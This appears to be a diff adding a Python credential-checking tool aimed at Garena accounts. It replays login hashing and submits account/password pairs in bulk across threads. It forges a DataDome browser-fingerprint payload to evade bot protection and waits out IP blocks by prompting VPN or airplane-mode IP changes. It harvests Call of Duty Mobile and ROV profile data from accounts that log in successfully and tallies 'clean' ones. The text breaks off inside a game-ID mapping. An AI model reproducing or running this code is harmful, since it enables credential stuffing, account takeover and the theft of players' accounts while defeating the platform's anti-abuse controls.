@@ -1,0 +1,2247 @@
+import os
+import sys
+import time
+import random
+import hashlib
+import json
+import logging
+import urllib.parse
+import signal
+from datetime import datetime
+from concurrent.futures import ThreadPoolExecutor
+from threading import Lock
+from Crypto.Cipher import AES
+import requests
+import cloudscraper
+import colorama
+import threading
+from colorama import Fore, Style, Back
+from rich.console import Console
+from rich.panel import Panel
+from rich.table import Table
+from rich.box import Box, DOUBLE
+from rich.live import Live
+from rich.progress import Progress, BarColumn, TextColumn, TimeRemainingColumn
+
+checked_accounts = set()
+
+colorama.init(autoreset=True)
+
+console = Console()
+
+CODM_REGIONS = {
+    'PH': {'name': 'Philippines', 'code': '63', 'flag': '🇵🇭'},
+    'ID': {'name': 'Indonesia', 'code': '62', 'flag': '🇮🇩'},
+    'HK': {'name': 'Hong Kong', 'code': '852', 'flag': '🇭🇰'},
+    'MY': {'name': 'Malaysia', 'code': '60', 'flag': '🇲🇾'},
+    'TW': {'name': 'Taiwan', 'code': '886', 'flag': '🇹🇼'},
+    'TH': {'name': 'Thailand', 'code': '66', 'flag': '🇹🇭'},
+    'SG': {'name': 'Singapore', 'code': '65', 'flag': '🇸🇬'},
+}
+
+class Colors:
+    LIGHTGREEN_EX = colorama.Fore.LIGHTGREEN_EX
+    WHITE = colorama.Fore.WHITE
+    BLUE = colorama.Fore.BLUE
+    GREEN = colorama.Fore.GREEN
+    RED = colorama.Fore.RED
+    CYAN = colorama.Fore.CYAN
+    LIGHTBLACK_EX = colorama.Fore.LIGHTBLACK_EX
+    RESET = colorama.Style.RESET_ALL 
+
+class ColoredFormatter(logging.Formatter):
+    COLORS = {
+        'DEBUG': colorama.Fore.BLUE,
+        'INFO': colorama.Fore.GREEN,
+        'WARNING': colorama.Fore.YELLOW,
+        'ERROR': colorama.Fore.RED,
+        'CRITICAL': colorama.Fore.RED + colorama.Back.WHITE,
+        'ORANGE': '\033[38;5;214m',
+        'PURPLE': '\033[95m',
+        'CYAN': '\033[96m',
+        'SUCCESS': '\033[92m',
+        'FAIL': '\033[91m'
+    }
+
+    RESET = colorama.Style.RESET_ALL
+
+    def format(self, record):
+        levelname = record.levelname
+        if levelname in self.COLORS:
+            record.msg = f"{self.COLORS[levelname]}{record.msg}{self.RESET}"
+        return super().format(record)
+
+logger = logging.getLogger()
+handler = logging.StreamHandler()
+handler.setFormatter(ColoredFormatter())
+logger.addHandler(handler)
+logger.setLevel(logging.DEBUG)
+
+logging.getLogger("urllib3").setLevel(logging.ERROR)
+logging.getLogger("requests").setLevel(logging.ERROR)
+
+class GracefulThreadPoolExecutor(ThreadPoolExecutor):
+    def __init__(self, *args, **kwargs):
+        super().__init__(*args, **kwargs)
+        self._shutdown = False
+        
+    def shutdown(self, wait=True, *, cancel_futures=False):
+        self._shutdown = True
+        super().shutdown(wait=wait, cancel_futures=cancel_futures)
+
+import os
+import random
+
+
+class CookieManager:
+    
+    
+    def __init__(self):
+        
+        self.banned_cookies = set()
+        self.load_banned_cookies()
+        
+    def load_banned_cookies(self):
+        
+        if os.path.exists('banned_cookies.txt'):
+            try:
+                with open('banned_cookies.txt', 'r') as f:
+                    self.banned_cookies = set(line.strip() for line in f if line.strip())
+            except IOError:
+                
+                pass
+    
+    def is_banned(self, cookie):
+        
+        return cookie in self.banned_cookies
+    
+    def mark_banned(self, cookie):
+        
+        self.banned_cookies.add(cookie)
+        try:
+            with open('banned_cookies.txt', 'a') as f:
+                f.write(cookie + '\n')
+        except IOError:
+            
+            pass
+    
+    def get_valid_cookie(self):
+        
+        if os.path.exists('fresh_cookies.txt'):
+            try:
+                with open('fresh_cookies.txt', 'r') as f:
+                    valid_cookies = [c for c in f.read().splitlines() 
+                                   if c.strip() and not self.is_banned(c.strip())]
+                if valid_cookies:
+                    return random.choice(valid_cookies)
+            except IOError:
+                
+                pass
+        return None
+    
+    def save_cookie(self, cookie):
+        
+        if not self.is_banned(cookie):
+            try:
+                with open('new_cookies.txt', 'a') as f:
+                    f.write(cookie + '\n')
+                return True
+            except IOError:
+                
+                pass
+        return False
+
+class DataDomeManager:
+    def __init__(self):
+        self.current_datadome = None
+        self.datadome_history = []
+        self._403_attempts = 0
+        
+    def set_datadome(self, datadome_cookie):
+        if datadome_cookie and datadome_cookie != self.current_datadome:
+            self.current_datadome = datadome_cookie
+            self.datadome_history.append(datadome_cookie)
+            if len(self.datadome_history) > 10:
+                self.datadome_history.pop(0)
+            
+    def get_datadome(self):
+        return self.current_datadome
+        
+    def extract_datadome_from_session(self, session):
+        try:
+            cookies_dict = session.cookies.get_dict()
+            datadome_cookie = cookies_dict.get('datadome')
+            if datadome_cookie:
+                self.set_datadome(datadome_cookie)
+                return datadome_cookie
+            return None
+        except Exception as e:
+            logger.warning(f"[WARNING] Error extracting datadome from session: {e}")
+            return None
+        
+    def clear_session_datadome(self, session):
+        try:
+            if 'datadome' in session.cookies:
+                del session.cookies['datadome']
+        except Exception as e:
+            logger.warning(f"[WARNING] Error clearing datadome cookies: {e}")
+        
+    def set_session_datadome(self, session, datadome_cookie=None):
+        try:
+            self.clear_session_datadome(session)
+            cookie_to_use = datadome_cookie or self.current_datadome
+            if cookie_to_use:
+                session.cookies.set('datadome', cookie_to_use, domain='.garena.com')
+                return True
+            return False
+        except Exception as e:
+            logger.warning(f"[WARNING] Error setting datadome cookie: {e}")
+            return False
+
+    def get_current_ip(self):
+        
+        ip_services = [
+            'https://api.ipify.org',
+            'https://icanhazip.com',
+            'https://ident.me',
+            'https://checkip.amazonaws.com'
+        ]
+        
+        for service in ip_services:
+            try:
+                response = requests.get(service, timeout=10)
+                if response.status_code == 200:
+                    ip = response.text.strip()
+                    if ip and '.' in ip:  
+                        return ip
+            except Exception:
+                continue
+        
+        logger.warning(f"[WARNING] Could not fetch IP from any service")
+        return None
+
+    def wait_for_ip_change(self, session, check_interval=10, max_wait_time=300):
+        
+        logger.info(f"[𝙄𝙉𝙁𝙊] Auto-detecting IP change...")
+        
+        original_ip = self.get_current_ip()
+        if not original_ip:
+            logger.warning(f"[WARNING] Could not determine current IP, waiting 30 seconds")
+            time.sleep(30)
+            return True
+            
+        logger.info(f"[𝙄𝙉𝙁𝙊] Current IP: {original_ip}")
+        logger.info(f"[𝙄𝙉𝙁𝙊] Waiting for IP change (checking every {check_interval} seconds, max {max_wait_time//60} minutes)...")
+        
+        start_time = time.time()
+        attempts = 0
+        
+        while time.time() - start_time < max_wait_time:
+            attempts += 1
+            try:
+                current_ip = self.get_current_ip()
+                
+                if current_ip and current_ip != original_ip:
+                    logger.info(f"[SUCCESS] IP changed from {original_ip} to {current_ip}")
+                    logger.info(f"[𝙄𝙉𝙁𝙊] IP changed successfully after {attempts} checks!")
+                    return True
+                else:
+                    if attempts % 3 == 0:  
+                        logger.info(f"[𝙄𝙉𝙁𝙊] IP check {attempts}: Still {original_ip} -> Waiting for change...")
+                    time.sleep(check_interval)
+            except Exception as e:
+                logger.warning(f"[WARNING] Error checking IP on attempt {attempts}: {e}")
+                time.sleep(check_interval)
+        
+        logger.warning(f"[WARNING] IP did not change after {max_wait_time} seconds")
+        return False
+
+    def handle_403(self, session):
+        self._403_attempts += 1
+        
+        if self._403_attempts >= 3:
+            logger.error(f"[ERROR] IP blocked after 3 attempts.")
+            logger.error(f"[𝙄𝙉𝙁𝙊] Network fix: WiFi -> Use VPN | Mobile Data -> Toggle Airplane Mode")
+            logger.info(f"[𝙄𝙉𝙁𝙊] Auto-detecting IP change...")
+            
+            if self.wait_for_ip_change(session):
+                logger.info(f"[SUCCESS] IP changed, fetching new DataDome cookie...")
+                
+                self._403_attempts = 0
+                
+                new_datadome = get_datadome_cookie(session)
+                if new_datadome:
+                    self.set_datadome(new_datadome)
+                    logger.info(f"[SUCCESS] New DataDome cookie obtained")
+                    return True
+                else:
+                    logger.error(f"[ERROR] Failed to fetch new DataDome after IP change")
+                    return False
+            else:
+                logger.error(f"[ERROR] IP did not change, cannot continue")
+                return False
+        return False
+
+class LiveStats:
+    def __init__(self):
+        self.valid_count = 0
+        self.invalid_count = 0
+
+        self.clean_count = 0
+        self.not_clean_count = 0
+
+        self.has_codm_count = 0
+        self.no_codm_count = 0
+
+        # ➕ เพิ่มของ ROV
+        self.rov_count = 0
+        self.rov_clean = 0
+        self.rov_not_clean = 0
+
+        self.lock = threading.Lock()
+
+    def update_stats(self, valid=False, clean=False, has_codm=False, has_rov=False, rov_clean=False):
+        with self.lock:
+
+            # VALID / INVALID
+            if valid:
+                self.valid_count += 1
+            else:
+                self.invalid_count += 1
+
+            # CLEAN / NOT CLEAN
+            if clean:
+                self.clean_count += 1
+            else:
+                self.not_clean_count += 1
+
+            # CODM
+            if has_codm:
+                self.has_codm_count += 1
+            else:
+                if valid:
+                    self.no_codm_count += 1
+
+            # ROV
+            if has_rov:
+                self.rov_count += 1
+                if rov_clean:
+                    self.rov_clean += 1
+                else:
+                    self.rov_not_clean += 1
+
+    def get_stats(self):
+        with self.lock:
+            return {
+                'valid': self.valid_count,
+                'invalid': self.invalid_count,
+                'clean': self.clean_count,
+                'not_clean': self.not_clean_count,
+                'has_codm': self.has_codm_count,
+                'no_codm': self.no_codm_count,
+                'rov_count': self.rov_count,
+                'rov_clean': self.rov_clean,
+                'rov_not_clean': self.rov_not_clean
+            }
+
+    def display_stats(self):
+        stats = self.get_stats()
+        bright_blue = '\033[94m'
+        reset_color = '\033[0m'
+
+        return (
+            f"{bright_blue}"
+            f"VALID [{stats['valid']}] | "
+            f"INVALID [{stats['invalid']}] | "
+            f"ROV [{stats['rov_count']}] | "
+            f"ROV CLEAN [{stats['rov_clean']}] | "
+            f"ROV NOT CLEAN [{stats['rov_not_clean']}] | "
+            f"CODM [{stats['has_codm']}]"
+            f"{reset_color}"
+        )
+
+
+def encode(plaintext, key):
+    key = bytes.fromhex(key)
+    plaintext = bytes.fromhex(plaintext)
+    cipher = AES.new(key, AES.MODE_ECB)
+    ciphertext = cipher.encrypt(plaintext)
+    return ciphertext.hex()[:32]
+
+def get_passmd5(password):
+    decoded_password = urllib.parse.unquote(password)
+    return hashlib.md5(decoded_password.encode('utf-8')).hexdigest()
+
+def hash_password(password, v1, v2):
+    passmd5 = get_passmd5(password)
+    inner_hash = hashlib.sha256((passmd5 + v1).encode()).hexdigest()
+    outer_hash = hashlib.sha256((inner_hash + v2).encode()).hexdigest()
+    return encode(passmd5, outer_hash)
+
+def applyck(session, cookie_str):
+    session.cookies.clear()
+    cookie_dict = {}
+    for item in cookie_str.split(";"):
+        item = item.strip()
+        if '=' in item:
+            try:
+                key, value = item.split("=", 1)
+                key = key.strip()
+                value = value.strip()
+                if key and value:
+                    cookie_dict[key] = value
+            except (ValueError, IndexError):
+                logger.warning(f"[WARNING] Skipping invalid cookie component: {item}")
+        else:
+            logger.warning(f"[WARNING] Skipping malformed cookie (no '='): {item}")
+    
+    if cookie_dict:
+        session.cookies.update(cookie_dict)
+        logger.info(f"[SUCCESS] Applied {len(cookie_dict)} cookies")
+    else:
+        logger.warning(f"[WARNING] No valid cookies found in the provided string")
+
+def get_datadome_cookie(session):
+    url = 'https://dd.garena.com/js/'
+    headers = {
+        'accept': '*/*',
+        'accept-encoding': 'gzip, deflate, br, zstd',
+        'accept-language': 'en-US,en;q=0.9',
+        'cache-control': 'no-cache',
+        'content-type': 'application/x-www-form-urlencoded',
+        'origin': 'https://account.garena.com',
+        'pragma': 'no-cache',
+        'referer': 'https://account.garena.com/',
+        'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-site',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36'
+    }
+    
+    payload = {
+        'jsData': json.dumps({
+            "ttst":76.70000004768372,"ifov":False,"hc":4,"br_oh":824,"br_ow":1536,"ua":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36","wbd":False,"dp0":True,"tagpu":5.738121195951787,"wdif":False,"wdifrm":False,"npmtm":False,"br_h":738,"br_w":260,"isf":False,"nddc":1,"rs_h":864,"rs_w":1536,"rs_cd":24,"phe":False,"nm":False,"jsf":False,"lg":"en-US","pr":1.25,"ars_h":824,"ars_w":1536,"tz":-480,"str_ss":True,"str_ls":True,"str_idb":True,"str_odb":False,"plgod":False,"plg":5,"plgne":True,"plgre":True,"plgof":False,"plggt":False,"pltod":False,"hcovdr":False,"hcovdr2":False,"plovdr":False,"plovdr2":False,"ftsovdr":False,"ftsovdr2":False,"lb":False,"eva":33,"lo":False,"ts_mtp":0,"ts_tec":False,"ts_tsa":False,"vnd":"Google Inc.","bid":"NA","mmt":"application/pdf,text/pdf","plu":"PDF Viewer,Chrome PDF Viewer,Chromium PDF Viewer,Microsoft Edge PDF Viewer,WebKit built-in PDF","hdn":False,"awe":False,"geb":False,"dat":False,"med":"defined","aco":"probably","acots":False,"acmp":"probably","acmpts":True,"acw":"probably","acwts":False,"acma":"maybe","acmats":False,"acaa":"probably","acaats":True,"ac3":"","ac3ts":False,"acf":"probably","acfts":False,"acmp4":"maybe","acmp4ts":False,"acmp3":"probably","acmp3ts":False,"acwm":"maybe","acwmts":False,"ocpt":False,"vco":"","vcots":False,"vch":"probably","vchts":True,"vcw":"probably","vcwts":True,"vc3":"maybe","vc3ts":False,"vcmp":"","vcmpts":False,"vcq":"maybe","vcqts":False,"vc1":"probably","vc1ts":True,"dvm":8,"sqt":False,"so":"landscape-primary","bda":False,"wdw":True,"prm":True,"tzp":True,"cvs":True,"usb":True,"cap":True,"tbf":False,"lgs":True,"tpd":True
+        }),
+        'eventCounters': '[]',
+        'jsType': 'ch',
+        'cid': 'KOWn3t9QNk3dJJJEkpZJpspfb2HPZIVs0KSR7RYTscx5iO7o84cw95j40zFFG7mpfbKxmfhAOs~bM8Lr8cHia2JZ3Cq2LAn5k6XAKkONfSSad99Wu36EhKYyODGCZwae',
+        'ddk': 'AE3F04AD3F0D3A462481A337485081',
+        'Referer': 'https://account.garena.com/',
+        'request': '/',
+        'responsePage': 'origin',
+        'ddv': '4.35.4'
+    }
+
+    data = '&'.join(f'{k}={urllib.parse.quote(str(v))}' for k, v in payload.items())
+
+    try:
+        response = requests.post(url, headers=headers, data=data, timeout=30)
+        response.raise_for_status()
+        response_json = response.json()
+        
+        if response_json['status'] == 200 and 'cookie' in response_json:
+            cookie_string = response_json['cookie']
+            datadome = cookie_string.split(';')[0].split('=')[1]
+            return datadome
+        else:
+            logger.error(f"[ERROR] DataDome cookie not found in response. Status code: {response_json['status']}")
+            return None
+    except requests.exceptions.RequestException as e:
+        logger.error(f"[ERROR] Error getting DataDome cookie: {e}")
+        return None
+    except Exception as e:
+        logger.error(f"[ERROR] Unexpected error getting DataDome cookie: {e}")
+        return None
+
+def prelogin(session, account, datadome_manager):
+    url = 'https://sso.garena.com/api/prelogin'
+    params = {
+        'app_id': '10100',
+        'account': account,
+        'format': 'json',
+        'id': str(int(time.time() * 1000))
+    }
+    
+    retries = 1
+    for attempt in range(retries):
+        try:
+            current_cookies = session.cookies.get_dict()
+            cookie_parts = []
+            
+            for cookie_name in ['apple_state_key', 'datadome', 'sso_key']:
+                if cookie_name in current_cookies:
+                    cookie_parts.append(f"{cookie_name}={current_cookies[cookie_name]}")
+            
+            cookie_header = '; '.join(cookie_parts) if cookie_parts else ''
+            
+            headers = {
+                'accept': 'application/json, text/plain, */*',
+                'accept-encoding': 'gzip, deflate, br, zstd',
+                'accept-language': 'en-US,en;q=0.9',
+                'connection': 'keep-alive',
+                'host': 'sso.garena.com',
+                'referer': f'https://sso.garena.com/universal/login?app_id=10100&redirect_uri=https%3A%2F%2Faccount.garena.com%2F&locale=en-SG&account={account}',
+                'sec-ch-ua': '"Google Chrome";v="133", "Chromium";v="133", "Not=A?Brand";v="99"',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': '"Windows"',
+                'sec-fetch-dest': 'empty',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-site': 'same-origin',
+                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36'
+            }
+            
+            if cookie_header:
+                headers['cookie'] = cookie_header            
+            
+            response = session.get(url, headers=headers, params=params, timeout=30)
+            
+            new_cookies = {}
+            
+            if 'set-cookie' in response.headers:
+                set_cookie_header = response.headers['set-cookie']
+                
+                for cookie_str in set_cookie_header.split(','):
+                    if '=' in cookie_str:
+                        try:
+                            cookie_name = cookie_str.split('=')[0].strip()
+                            cookie_value = cookie_str.split('=')[1].split(';')[0].strip()
+                            if cookie_name and cookie_value:
+                                new_cookies[cookie_name] = cookie_value
+                        except Exception as e:
+                            pass
+            
+            try:
+                response_cookies = response.cookies.get_dict()
+                for cookie_name, cookie_value in response_cookies.items():
+                    if cookie_name not in new_cookies:
+                        new_cookies[cookie_name] = cookie_value
+            except Exception as e:
+                pass
+            
+            for cookie_name, cookie_value in new_cookies.items():
+                if cookie_name in ['datadome', 'apple_state_key', 'sso_key']:
+                    session.cookies.set(cookie_name, cookie_value, domain='.garena.com')
+                    if cookie_name == 'datadome':
+                        datadome_manager.set_datadome(cookie_value)
+            
+            new_datadome = new_cookies.get('datadome')
+            
+            if response.status_code == 403:
+                logger.error(f"[ERROR] 403 Forbidden during prelogin for {account} (attempt {attempt + 1}/{retries})")
+                
+                if new_cookies and attempt < retries - 1:
+                    logger.info(f"[RETRY] Got new cookies from 403, retrying...")
+                    time.sleep(2)
+                    continue
+                
+                if datadome_manager.handle_403(session):
+                    return "IP_BLOCKED", None, None
+                else:
+                    logger.error(f"[ERROR] Cannot continue with {account} due to IP block")
+                    return None, None, new_datadome
+                
+                if attempt < retries - 1:
+                    time.sleep(1)
+                    continue
+                return None, None, new_datadome
+            
+            response.raise_for_status()
+            
+            try:
+                data = response.json()
+            except json.JSONDecodeError:
+                logger.error(f"[ERROR] Invalid JSON response from prelogin for {account}")
+                if attempt < retries - 1:
+                    time.sleep(2)
+                    continue
+                return None, None, new_datadome
+            
+            if 'error' in data:
+                
+                return None, None, new_datadome
+                
+            v1 = data.get('v1')
+            v2 = data.get('v2')
+            
+            if not v1 or not v2:
+                logger.error(f"[ERROR] Missing v1 or v2 in prelogin response for {account}")
+                return None, None, new_datadome
+                
+            logger.info(f"[SUCCESS] Prelogin successful: {account}")
+            
+            return v1, v2, new_datadome
+            
+        except requests.exceptions.HTTPError as e:
+            if hasattr(e, 'response') and e.response is not None:
+                if e.response.status_code == 403:
+                    logger.error(f"[ERROR] 403 Forbidden during prelogin for {account} (attempt {attempt + 1}/{retries})")
+                    
+                    new_cookies = {}
+                    if 'set-cookie' in e.response.headers:
+                        set_cookie_header = e.response.headers['set-cookie']
+                        for cookie_str in set_cookie_header.split(','):
+                            if '=' in cookie_str:
+                                try:
+                                    cookie_name = cookie_str.split('=')[0].strip()
+                                    cookie_value = cookie_str.split('=')[1].split(';')[0].strip()
+                                    if cookie_name and cookie_value:
+                                        new_cookies[cookie_name] = cookie_value
+                                        session.cookies.set(cookie_name, cookie_value, domain='.garena.com')
+                                        if cookie_name == 'datadome':
+                                            datadome_manager.set_datadome(cookie_value)
+                                except Exception as ex:
+                                    pass
+                    
+                    if new_cookies and attempt < retries - 1:
+                        logger.info(f"[RETRY] Retrying with new cookies from 403...")
+                        time.sleep(2)
+                        continue
+                    
+                    if datadome_manager.handle_403(session):
+                        return "IP_BLOCKED", None, None
+                    else:
+                        logger.error(f"[ERROR] Cannot continue with {account} due to IP block")
+                        return None, None, new_cookies.get('datadome')
+                        
+                    if attempt < retries - 1:
+                        time.sleep(2)
+                        continue
+                    return None, None, new_cookies.get('datadome')
+                else:
+                    logger.error(f"[ERROR] HTTP error {e.response.status_code} fetching prelogin data for {account} (attempt {attempt + 1}/{retries}): {e}")
+            else:
+                logger.error(f"[ERROR] HTTP error fetching prelogin data for {account} (attempt {attempt + 1}/{retries}): {e}")
+                
+            if attempt < retries - 1:
+                time.sleep(2)
+                continue
+        except Exception as e:
+            logger.error(f"[ERROR] Error fetching prelogin data for {account} (attempt {attempt + 1}/{retries}): {e}")
+            if attempt < retries - 1:
+                time.sleep(2)
+                
+    return None, None, None
+
+def login(session, account, password, v1, v2):
+    hashed_password = hash_password(password, v1, v2)
+    url = 'https://sso.garena.com/api/login'
+    params = {
+        'app_id': '10100',
+        'account': account,
+        'password': hashed_password,
+        'redirect_uri': 'https://account.garena.com/',
+        'format': 'json',
+        'id': str(int(time.time() * 1000))
+    }
+    
+    current_cookies = session.cookies.get_dict()
+    cookie_parts = []
+    for cookie_name in ['apple_state_key', 'datadome', 'sso_key']:
+        if cookie_name in current_cookies:
+            cookie_parts.append(f"{cookie_name}={current_cookies[cookie_name]}")
+    cookie_header = '; '.join(cookie_parts) if cookie_parts else ''
+    
+    headers = {
+        'accept': 'application/json, text/plain, */*',
+        'referer': 'https://account.garena.com/',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0.0.0 Safari/537.36'
+    }
+    
+    if cookie_header:
+        headers['cookie'] = cookie_header
+    
+    retries = 3
+    for attempt in range(retries):
+        try:
+            response = session.get(url, headers=headers, params=params, timeout=30)
+            response.raise_for_status()
+            
+            login_cookies = {}
+            
+            if 'set-cookie' in response.headers:
+                set_cookie_header = response.headers['set-cookie']
+                for cookie_str in set_cookie_header.split(','):
+                    if '=' in cookie_str:
+                        try:
+                            cookie_name = cookie_str.split('=')[0].strip()
+                            cookie_value = cookie_str.split('=')[1].split(';')[0].strip()
+                            if cookie_name and cookie_value:
+                                login_cookies[cookie_name] = cookie_value
+                        except Exception as e:
+                            pass
+            
+            try:
+                response_cookies = response.cookies.get_dict()
+                for cookie_name, cookie_value in response_cookies.items():
+                    if cookie_name not in login_cookies:
+                        login_cookies[cookie_name] = cookie_value
+            except Exception as e:
+                pass
+            
+            for cookie_name, cookie_value in login_cookies.items():
+                if cookie_name in ['sso_key', 'apple_state_key', 'datadome']:
+                    session.cookies.set(cookie_name, cookie_value, domain='.garena.com')
+            
+            try:
+                data = response.json()
+            except json.JSONDecodeError:
+                logger.error(f"[ERROR] Invalid JSON response from login for {account}")
+                if attempt < retries - 1:
+                    time.sleep(2)
+                    continue
+                return None
+            
+            sso_key = login_cookies.get('sso_key') or response.cookies.get('sso_key')
+            
+            if 'error' in data:
+                error_msg = data['error']
+                
+                
+                if error_msg == 'ACCOUNT DOESNT EXIST':
+                    logger.warning(f"[WARNING] Authentication error - likely invalid credentials for {account}")
+                    return None
+                elif 'captcha' in error_msg.lower():
+                    logger.warning(f"[WARNING] Captcha required for {account}")
+                    time.sleep(3)
+                    continue
+                    
+            return sso_key
+            
+        except requests.RequestException as e:
+            logger.error(f"[ERROR] Login request failed for {account} (attempt {attempt + 1}): {e}")
+            if attempt < retries - 1:
+                time.sleep(2)
+                
+    return None
+
+def get_codm_access_token(session):
+    try:
+        random_id = str(int(time.time() * 1000))
+        token_url = "https://auth.garena.com/oauth/token/grant"
+        token_headers = {
+            "User-Agent": "Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
+            "Pragma": "no-cache",
+            "Accept": "*/*",
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Referer": "https://auth.garena.com/universal/oauth?all_platforms=1&response_type=token&locale=en-SG&client_id=100082&redirect_uri=https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/"
+        }
+        token_data = "client_id=100082&response_type=token&redirect_uri=https%3A%2F%2Fauth.codm.garena.com%2Fauth%2Fauth%2Fcallback_n%3Fsite%3Dhttps%3A%2F%2Fapi-delete-request.codm.garena.co.id%2Foauth%2Fcallback%2F&format=json&id=" + random_id
+        
+        token_response = session.post(token_url, headers=token_headers, data=token_data)
+        token_data = token_response.json()
+        return token_data.get("access_token", "")
+    except Exception as e:
+        logger.error(f"[ERROR] Error getting CODM access token: {e}")
+        return ""
+
+def process_codm_callback(session, access_token):
+    try:
+        codm_callback_url = f"https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/&access_token={access_token}"
+        callback_headers = {
+            "authority": "auth.codm.garena.com",
+            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+            "accept-language": "en-US,en;q=0.9",
+            "cache-control": "no-cache",
+            "pragma": "no-cache",
+            "referer": "https://auth.garena.com/",
+            "sec-ch-ua": "\"Chromium\";v=\"107\", \"Not=A?Brand\";v=\"24\"",
+            "sec-ch-ua-mobile": "?1",
+            "sec-ch-ua-platform": "\"Android\"",
+            "sec-fetch-dest": "document",
+            "sec-fetch-mode": "navigate",
+            "sec-fetch-site": "same-site",
+            "sec-fetch-user": "?1",
+            "upgrade-insecure-requests": "1",
+            "user-agent": "Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
+        }
+        
+        callback_response = session.get(codm_callback_url, headers=callback_headers, allow_redirects=False)
+        
+        api_callback_url = f"https://api-delete-request.codm.garena.co.id/oauth/callback/?access_token={access_token}"
+        api_callback_headers = {
+            "authority": "api-delete-request.codm.garena.co.id",
+            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+            "accept-language": "en-US,en;q=0.9",
+            "cache-control": "no-cache",
+            "pragma": "no-cache",
+            "referer": "https://auth.garena.com/",
+            "sec-ch-ua": "\"Chromium\";v=\"107\", \"Not=A?Brand\";v=\"24\"",
+            "sec-ch-ua-mobile": "?1",
+            "sec-ch-ua-platform": "\"Android\"",
+            "sec-fetch-dest": "document",
+            "sec-fetch-mode": "navigate",
+            "sec-fetch-site": "cross-site",
+            "sec-fetch-user": "?1",
+            "upgrade-insecure-requests": "1",
+            "user-agent": "Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
+        }
+        
+        api_callback_response = session.get(api_callback_url, headers=api_callback_headers, allow_redirects=False)
+        location = api_callback_response.headers.get("Location", "")
+        
+        if "err=3" in location:
+            return None, "no_codm"
+        elif "token=" in location:
+            token = location.split("token=")[-1].split('&')[0]
+            return token, "success"
+        else:
+            return None, "unknown_error"
+            
+    except Exception as e:
+        logger.error(f"[ERROR] Error processing CODM callback: {e}")
+        return None, "error"
+
+def get_codm_user_info(session, token):
+    try:
+        check_login_url = "https://api-delete-request.codm.garena.co.id/oauth/check_login/"
+        check_headers = {
+            "authority": "api-delete-request.codm.garena.co.id",
+            "accept": "application/json, text/plain, */*",
+            "accept-language": "en-US,en;q=0.9",
+            "accept-encoding": "gzip, deflate, br, zstd",
+            "cache-control": "no-cache",
+            "codm-delete-token": token,
+            "origin": "https://delete-request.codm.garena.co.id",
+            "pragma": "no-cache",
+            "referer": "https://delete-request.codm.garena.co.id/",
+            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
+            "sec-ch-ua-mobile": "?1",
+            "sec-ch-ua-platform": '"Android"',
+            "sec-fetch-dest": "empty",
+            "sec-fetch-mode": "cors",
+            "sec-fetch-site": "same-site",
+            "user-agent": "Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
+            "x-requested-with": "XMLHttpRequest"
+        }
+        
+        check_response = session.get(check_login_url, headers=check_headers)
+        check_data = check_response.json()
+        
+        user_data = check_data.get("user", {})
+        if user_data:
+            
+            region_code = user_data.get("region", "N/A")
+            region_info = CODM_REGIONS.get(region_code, {})
+            
+            return {
+                "codm_nickname": user_data.get("codm_nickname", "N/A"),
+                "codm_level": user_data.get("codm_level", "N/A"),
+                "region": region_code,  
+                "region_name": region_info.get('name', 'Unknown'),
+                "region_flag": region_info.get('flag', '🏳️'),
+                "uid": user_data.get("uid", "N/A"),
+                "open_id": user_data.get("open_id", "N/A"),
+                "t_open_id": user_data.get("t_open_id", "N/A")
+            }
+        return {}
+        
+    except Exception as e:
+        logger.error(f"❌ Error getting CODM user info: {e}")
+        return {}
+
+def check_codm_account(session, account):
+    codm_info = {}
+    has_codm = False
+    
+    try:
+        access_token = get_codm_access_token(session)
+        if not access_token:
+            logger.warning(f"⚠️ No CODM access token for {account}")
+            return has_codm, codm_info
+        
+        codm_token, status = process_codm_callback(session, access_token)
+        
+        if status == "no_codm":
+            logger.info(f"⚠️ No CODM detected for {account}")
+            return has_codm, codm_info
+        elif status != "success" or not codm_token:
+            logger.warning(f"⚠️ CODM callback failed for {account}: {status}")
+            return has_codm, codm_info
+        
+        codm_info = get_codm_user_info(session, codm_token)
+        if codm_info:
+            has_codm = True
+            
+            
+    except Exception as e:
+        logger.error(f"❌ Error checking CODM for {account}: {e}")
+    
+    return has_codm, codm_info
+
+def get_game_connections(session, account):
+    game_info = []
+    valid_regions = {'sg', 'ph', 'my', 'tw', 'th', 'id', 'in', 'vn'}
+    
+    game_mappings = {
+        'tw': {
+            "100082": "CODM",
+            "100067": "FREE FIRE",
+            "100070": "SPEED DRIFTERS",
+            "100130": "BLACK CLOVER M",
+            "100105": "GARENA UNDAWN",
+            "100050": "ROV",
